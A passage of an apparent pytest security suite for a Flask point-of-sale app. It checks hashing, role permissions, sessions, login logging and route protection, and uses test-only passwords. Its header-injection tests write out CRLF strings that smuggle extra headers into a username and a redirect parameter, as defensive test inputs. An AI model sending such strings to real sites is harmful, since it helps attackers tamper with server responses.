        assert b'Invalid' in response.data or b'login' in response.data.lower()

    def test_carriage_return_in_input(self, security_client, setup_users):
        """Test handling of carriage returns in input."""
        response = security_client.post('/auth/login', data={
            'username': 'testadmin\r\n',
            'password': 'Admin@123!'
        }, follow_redirects=True)
        # Should handle gracefully
        assert response.status_code == 200


# ============================================================================
# 11. PASSWORD HASHING TESTS
# ============================================================================

class TestPasswordHashing:
    """Test password hashing security."""

    def test_password_is_hashed(self, security_app, setup_users):
        """Test that passwords are properly hashed, not stored in plaintext."""
        with security_app.app_context():
            user = User.query.filter_by(username='testadmin').first()

            # Password should not be stored in plaintext
            assert user.password_hash != 'Admin@123!'
            assert 'pbkdf2' in user.password_hash or 'scrypt' in user.password_hash or 'sha' in user.password_hash.lower()

    def test_same_password_different_hash(self, security_app, setup_users):
        """Test that same password produces different hashes (salting)."""
        with security_app.app_context():
            user1 = User.query.filter_by(username='testadmin').first()
            user2 = User.query.filter_by(username='testmanager').first()

            # Set same password for both
            same_password = 'SamePassword@123!'
            user1.set_password(same_password)
            user2.set_password(same_password)
            db.session.commit()

            # Hashes should be different due to salt
            assert user1.password_hash != user2.password_hash

    def test_password_verification_timing(self, security_app, setup_users):
        """Test that password verification doesn't leak timing info."""
        with security_app.app_context():
            user = User.query.filter_by(username='testadmin').first()

            # Measure timing for correct password
            start = time.time()
            user.check_password('Admin@123!')
            correct_time = time.time() - start

            # Measure timing for wrong password
            start = time.time()
            user.check_password('WrongPassword!')
            wrong_time = time.time() - start

            # Times should be relatively similar (within 10x)
            # This is a basic check; proper timing attack tests need more sophistication
            ratio = max(correct_time, wrong_time) / max(min(correct_time, wrong_time), 0.000001)
            assert ratio < 100  # Very loose bound for test reliability


# ============================================================================
# 12. ROLE HIERARCHY TESTS
# ============================================================================

class TestRoleHierarchy:
    """Test role hierarchy and permission inheritance."""

    def test_default_roles_exist(self, security_app, setup_rbac):
        """Test that all default roles are created."""
        with security_app.app_context():
            expected_roles = ['admin', 'manager', 'cashier', 'inventory_manager',
                           'accountant', 'warehouse_manager', 'kiosk_manager', 'regional_manager']

            for role_name in expected_roles:
                role = Role.query.filter_by(name=role_name).first()
                assert role is not None, f"Role {role_name} not found"

    def test_admin_role_has_most_permissions(self, security_app, setup_rbac):
        """Test that admin role has the most permissions."""
        with security_app.app_context():
            admin_role = Role.query.filter_by(name='admin').first()
            other_roles = Role.query.filter(Role.name != 'admin').all()

            admin_perm_count = len(admin_role.permissions)

            for role in other_roles:
                assert len(role.permissions) <= admin_perm_count

    def test_cashier_role_has_minimal_permissions(self, security_app, setup_rbac):
        """Test that cashier role has minimal permissions."""
        with security_app.app_context():
            cashier_role = Role.query.filter_by(name='cashier').first()
            manager_role = Role.query.filter_by(name='manager').first()

            assert len(cashier_role.permissions) < len(manager_role.permissions)

    def test_system_roles_marked_correctly(self, security_app, setup_rbac):
        """Test that system roles are marked as such."""
        with security_app.app_context():
            roles = Role.query.all()
            for role in roles:
                # All default roles should be system roles
                assert role.is_system == True


# ============================================================================
# 13. CONCURRENT SESSION TESTS
# ============================================================================

class TestConcurrentSessions:
    """Test handling of concurrent sessions."""

    def test_multiple_sessions_same_user(self, security_app, setup_users):
        """Test that user can have multiple concurrent sessions."""
        client1 = security_app.test_client()
        client2 = security_app.test_client()

        # Login from both clients
        client1.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)

        client2.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)

        # Both should be able to access protected resources
        response1 = client1.get('/inventory/', follow_redirects=True)
        response2 = client2.get('/inventory/', follow_redirects=True)

        assert response1.status_code == 200
        assert response2.status_code == 200

    def test_logout_one_session_others_remain(self, security_app, setup_users):
        """Test that logging out one session doesn't affect others."""
        client1 = security_app.test_client()
        client2 = security_app.test_client()

        # Login from both clients
        client1.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)

        client2.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)

        # Logout from client1
        client1.get('/auth/logout', follow_redirects=True)

        # Client2 should still be logged in
        response2 = client2.get('/inventory/', follow_redirects=True)
        assert response2.status_code == 200


# ============================================================================
# 14. BRUTE FORCE PROTECTION (DETECTION)
# ============================================================================

class TestBruteForceDetection:
    """Test brute force attack detection via activity logs."""

    def test_failed_logins_logged(self, security_app, security_client, setup_users):
        """Test that failed login attempts are logged."""
        with security_app.app_context():
            initial_count = ActivityLog.query.filter_by(action='failed_login').count()

        # Attempt multiple failed logins
        for i in range(5):
            security_client.post('/auth/login', data={
                'username': 'testadmin',
                'password': f'wrongpassword{i}'
            }, follow_redirects=True)

        with security_app.app_context():
            final_count = ActivityLog.query.filter_by(action='failed_login').count()
            assert final_count == initial_count + 5

    def test_failed_login_includes_username(self, security_app, security_client, setup_users):
        """Test that failed login logs include attempted username."""
        security_client.post('/auth/login', data={
            'username': 'suspicioususer',
            'password': 'wrongpassword'
        }, follow_redirects=True)

        with security_app.app_context():
            log = ActivityLog.query.filter_by(action='failed_login').order_by(
                ActivityLog.timestamp.desc()
            ).first()

            assert log is not None
            assert 'suspicioususer' in log.details


# ============================================================================
# 15. API AUTHENTICATION TESTS
# ============================================================================

class TestAPIAuthentication:
    """Test API endpoint authentication."""

    def test_api_requires_authentication(self, security_client, setup_users):
        """Test that API endpoints require authentication."""
        # Try to access API-style endpoint without auth
        response = security_client.get(
            '/inventory/api/products/search',
            headers={'Accept': 'application/json'}
        )
        # Should redirect to login or return 401
        assert response.status_code in [302, 401, 404]

    def test_api_returns_json_unauthorized(self, security_app, setup_users):
        """Test that JSON requests get JSON error responses."""
        client = security_app.test_client()

        # Make request with JSON accept header
        response = client.get(
            '/inventory/',
            headers={
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            }
        )
        # Should redirect or return error
        assert response.status_code in [302, 401, 200]

    def test_authenticated_api_access(self, security_client, setup_users):
        """Test API access with valid authentication."""
        # Login first
        security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)

        # Access API endpoint
        response = security_client.get('/inventory/', follow_redirects=True)
        assert response.status_code == 200


# ============================================================================
# 16. PERMISSION CONSTANTS TESTS
# ============================================================================

class TestPermissionConstants:
    """Test permission constant definitions."""

    def test_all_permissions_defined(self):
        """Test that all permission constants are properly defined."""
        # Check POS permissions
        assert Permissions.POS_VIEW == 'pos.view'
        assert Permissions.POS_CREATE_SALE == 'pos.create_sale'
        assert Permissions.POS_VOID_SALE == 'pos.void_sale'

        # Check Inventory permissions
        assert Permissions.INVENTORY_VIEW == 'inventory.view'
        assert Permissions.INVENTORY_CREATE == 'inventory.create'
        assert Permissions.INVENTORY_EDIT == 'inventory.edit'

        # Check Settings permissions
        assert Permissions.SETTINGS_VIEW == 'settings.view'
        assert Permissions.SETTINGS_MANAGE_USERS == 'settings.manage_users'

    def test_get_all_permissions_returns_list(self):
        """Test that get_all_permissions returns correct format."""
        perms = get_all_permissions()

        assert isinstance(perms, list)
        assert len(perms) > 0

        # Check structure
        for perm in perms:
            assert len(perm) == 3
            assert isinstance(perm[0], str)  # name
            assert isinstance(perm[1], str)  # display_name
            assert isinstance(perm[2], str)  # module

    def test_get_default_roles_returns_dict(self):
        """Test that get_default_roles returns correct format."""
        roles = get_default_roles()

        assert isinstance(roles, dict)
        assert 'admin' in roles
        assert 'manager' in roles
        assert 'cashier' in roles

        # Check structure
        for role_name, role_info in roles.items():
            assert 'display_name' in role_info
            assert 'description' in role_info
            assert 'permissions' in role_info
            assert 'is_system' in role_info
            assert isinstance(role_info['permissions'], list)


# ============================================================================
# 17. USER MODEL SECURITY TESTS
# ============================================================================

class TestUserModelSecurity:
    """Test User model security methods."""

    def test_password_not_readable(self, security_app, setup_users):
        """Test that password cannot be read back after setting."""
        with security_app.app_context():
            user = User.query.filter_by(username='testadmin').first()

            # There should be no way to get the original password
            assert not hasattr(user, 'password')
            assert 'Admin@123!' not in str(user.__dict__)

    def test_user_repr_no_sensitive_data(self, security_app, setup_users):
        """Test that user repr doesn't expose sensitive data."""
        with security_app.app_context():
            user = User.query.filter_by(username='testadmin').first()
            repr_str = repr(user)

            assert 'password' not in repr_str.lower()
            assert 'hash' not in repr_str.lower()
            assert 'Admin@123!' not in repr_str

    def test_is_active_flag_respected(self, security_app, setup_users):
        """Test that is_active flag is properly respected."""
        with security_app.app_context():
            active_user = User.query.filter_by(username='testadmin').first()
            inactive_user = User.query.filter_by(username='inactiveuser').first()

            assert active_user.is_active == True
            assert inactive_user.is_active == False


# ============================================================================
# 18. ROUTE PROTECTION INTEGRATION TESTS
# ============================================================================

class TestRouteProtection:
    """Integration tests for route protection."""

    PROTECTED_ROUTES = [
        '/inventory/',
        '/customers/',
        '/suppliers/',
        '/pos/',
        '/reports/',
        '/settings/',
        '/warehouse/',
        '/transfers/',
    ]

    @pytest.mark.parametrize("route", PROTECTED_ROUTES)
    def test_protected_routes_require_auth(self, security_client, setup_users, route):
        """Test that protected routes redirect unauthenticated users."""
        response = security_client.get(route, follow_redirects=False)
        assert response.status_code == 302
        assert '/login' in response.location

    def test_pos_accessible_to_cashier(self, security_client, setup_users):
        """Test that cashier can access POS."""
        security_client.post('/auth/login', data={
            'username': 'testcashier',
            'password': 'Cashier@123!'
        }, follow_redirects=True)

        response = security_client.get('/pos/', follow_redirects=True)
        assert response.status_code == 200

    def test_settings_blocked_for_cashier(self, security_client, setup_users):
        """Test that cashier cannot access settings."""
        security_client.post('/auth/login', data={
            'username': 'testcashier',
            'password': 'Cashier@123!'
        }, follow_redirects=True)

        response = security_client.get('/settings/', follow_redirects=True)
        # Should be forbidden
        assert b'permission' in response.data.lower() or response.status_code == 403


# ============================================================================
# 19. COMPREHENSIVE ROLE PERMISSION MATRIX TESTS
# ============================================================================

class TestRolePermissionMatrix:
    """Test complete role-permission matrix."""

    def test_cashier_cannot_delete_inventory(self, security_client, setup_users):
        """Test cashier cannot delete inventory items."""
        security_client.post('/auth/login', data={
            'username': 'testcashier',
            'password': 'Cashier@123!'
        }, follow_redirects=True)

        response = security_client.post('/inventory/delete/1', follow_redirects=True)
        assert b'permission' in response.data.lower() or response.status_code in [403, 404]

    def test_cashier_cannot_manage_users(self, security_client, setup_users):
        """Test cashier cannot access user management."""
        security_client.post('/auth/login', data={
            'username': 'testcashier',
            'password': 'Cashier@123!'
        }, follow_redirects=True)

        response = security_client.get('/settings/users', follow_redirects=True)
        assert b'permission' in response.data.lower() or response.status_code == 403

    def test_manager_can_view_customers(self, security_client, setup_users):
        """Test manager can view customers."""
        security_client.post('/auth/login', data={
            'username': 'testmanager',
            'password': 'Manager@123!'
        }, follow_redirects=True)

        response = security_client.get('/customers/', follow_redirects=True)
        assert response.status_code == 200

    def test_warehouse_manager_can_approve_transfers(self, security_app, setup_users):
        """Test warehouse manager has transfer approval permission."""
        with security_app.app_context():
            wh_manager = User.query.filter_by(username='testwhmanager').first()
            assert wh_manager.has_permission('transfer.approve')

    def test_admin_can_access_all_routes(self, security_client, setup_users):
        """Test admin can access all protected routes."""
        security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)

        routes_to_test = [
            '/inventory/',
            '/customers/',
            '/pos/',
            '/settings/',
            '/reports/',
        ]

        for route in routes_to_test:
            response = security_client.get(route, follow_redirects=True)
            assert response.status_code == 200, f"Admin blocked from {route}"


# ============================================================================
# 20. HEADER INJECTION TESTS
# ============================================================================

class TestHeaderInjection:
    """Test HTTP header injection prevention."""

    def test_crlf_injection_username(self, security_client, setup_users):
        """Test CRLF injection in username is handled."""
        response = security_client.post('/auth/login', data={
            'username': 'admin\r\nX-Injected: header',
            'password': 'password'
        }, follow_redirects=True)

        # Should not crash and should not have injected header
        assert response.status_code == 200
        assert 'X-Injected' not in str(response.headers)

    def test_header_injection_in_redirect(self, security_client, setup_users):
        """Test header injection via redirect URL."""
        response = security_client.post('/auth/login?next=/\r\nX-Evil:header', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=False)

        # Should handle safely
        if response.status_code == 302:
            assert 'X-Evil' not in str(response.headers)


# ============================================================================
# 21. TIMING ATTACK RESISTANCE
# ============================================================================

class TestTimingAttacks:
    """Test resistance to timing attacks."""

    def test_consistent_response_time_valid_user(self, security_client, setup_users):
        """Test that response time is similar for valid/invalid usernames."""
        # Time for valid username, wrong password
        start = time.time()
        security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'wrongpassword'
        })
        valid_user_time = time.time() - start

        # Time for invalid username
        start = time.time()
        security_client.post('/auth/login', data={
            'username': 'nonexistentuser12345',
            'password': 'wrongpassword'
        })
        invalid_user_time = time.time() - start

        # Times should be in same order of magnitude
        # This is a loose check; real timing attack tests need statistical analysis
        ratio = max(valid_user_time, invalid_user_time) / max(min(valid_user_time, invalid_user_time), 0.0001)
        assert ratio < 10  # Within 10x is acceptable for basic test


# ============================================================================
# 22. ACTIVITY LOG SECURITY TESTS
# ============================================================================

class TestActivityLogSecurity:
    """Test activity logging security."""

    def test_activity_log_captures_ip(self, security_app, security_client, setup_users):
        """Test that activity logs capture IP address."""
        security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)

        with security_app.app_context():
            log = ActivityLog.query.filter_by(action='login').order_by(
                ActivityLog.timestamp.desc()
            ).first()

            assert log is not None
            # IP should be captured (may be None or 127.0.0.1 in test)

    def test_activity_log_captures_user_id(self, security_app, security_client, setup_users):
        """Test that activity logs capture user ID."""
        security_client.post('/auth/login', data={
            'username': 'testadmin',
            'password': 'Admin@123!'
        }, follow_redirects=True)

        with security_app.app_context():
            admin = User.query.filter_by(username='testadmin').first()
            log = ActivityLog.query.filter_by(action='login', user_id=admin.id).first()

            assert log is not None
            assert log.user_id == admin.id


# ============================================================================
# MAIN
# ============================================================================

if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])
